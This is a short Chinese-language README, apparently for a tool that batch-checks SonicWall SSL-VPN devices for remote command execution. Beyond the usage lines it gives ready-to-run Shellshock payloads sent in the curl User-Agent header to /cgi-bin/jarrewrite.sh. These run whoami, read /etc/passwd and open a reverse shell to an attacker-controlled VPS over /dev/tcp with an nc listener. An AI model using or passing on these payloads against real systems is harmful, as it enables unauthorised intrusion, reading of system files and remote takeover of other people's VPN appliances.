# SonicWallSSL-VPN_RCE

一个简单的SonicWallSSL-VPN远程命令执行批量检测脚本

脚本写得比较简单，主要是对于批量url检测比较实用

用法：将需要检测的url放入同一目录下的url.txt中

执行

python3 SonicWallSSL-VPN_RCE.py



单个url检测直接在命令行检测即可，

比如：

命令执行：

curl -A "() { :; }; echo ; /bin/bash -c 'whoami'" https://x.x.x.x/cgi-bin/jarrewrite.sh -k

curl -A "() { :; }; echo ; /bin/bash -c 'cat /etc/passwd'" https://x.x.x.x/cgi-bin/jarrewrite.sh -k

反弹shell：

VPS nc监听1234端口，

然后

curl -A "() { :; }; echo ; /bin/bash -c ' bash -i >& /dev/tcp/VPS的IP/1234  0>&1 '" https://x.x.x.x/cgi-bin/jarrewrite.sh -k
